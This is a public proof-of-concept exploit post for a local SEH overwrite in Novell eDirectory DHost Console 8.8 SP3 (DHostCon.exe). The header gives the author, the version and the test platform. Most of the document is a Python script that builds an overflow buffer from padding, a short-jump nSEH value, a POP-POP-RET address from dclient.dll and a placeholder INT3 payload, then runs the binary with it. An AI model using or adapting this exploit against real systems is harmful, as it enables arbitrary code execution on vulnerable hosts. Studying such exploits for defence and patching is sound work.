# Exploit Title: 	Novel eDirectory DHost Console 8.8 SP3 Local SEH Overwrite
# Date: 		17/10/2010 
# Author: 		d0lc3	 (@rmallof - http://elotrolad0.blogspot.com/)
# Software Link: 	http://www.novell.com/
# Version: 		8.8 SP3 (20216.67)]
# Tested on: 		win32 xp sp3 (spa)

#Summary:
#	DHostCon.exe is prone to local denial of service caused by stack overflow
#	triggered if user-supplied parameters are too long (1074 bytes).
#	Due nature of this vulnerabilty, attackers could exploit this issue
#	to execute arbitrary code on local host.

#PoC:

#!/usr/bin/python
import os,struct

def main():
	path="C:\Novell\NDS\dhostcon.exe"	
	args="x.x.x.x"				#ip server
	buf="A"*1065
	nseh=struct.pack("<L",0x90909eeb)	#jmp short 0012ff50 +NOP + NOP
	seh=struct.pack("<L",0x61012c20)	#PPR dclient.dll
	
	shellcode=struct.pack("<B",0xCC)	#INT3

	crash=buf+shellcode+nseh+seh

	os.system(path+" "+args+" "+crash)	#Crash!

if __name__=="__main__":
	main()